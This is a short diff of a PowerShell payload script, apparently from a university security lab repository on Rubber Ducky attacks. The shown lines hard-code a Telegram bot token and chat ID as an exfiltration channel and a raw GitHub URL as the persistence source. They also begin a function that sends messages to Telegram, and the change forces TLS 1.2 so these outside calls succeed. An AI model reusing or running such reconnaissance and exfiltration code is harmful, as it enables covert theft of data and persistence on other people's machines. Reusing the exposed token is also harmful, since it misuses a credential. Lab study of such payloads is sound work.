@@ -13,6 +13,9 @@ $BOT_TOKEN            = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
 $CHAT_ID              = "1780237079"
 $PERSIST_RAW_URL      = "https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1"
 
+# ARM64 + older PS configs default to TLS 1.0 - force 1.2 for GitHub/Telegram
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 function Send-TgMessage {
     param([string]$Text)
     try {
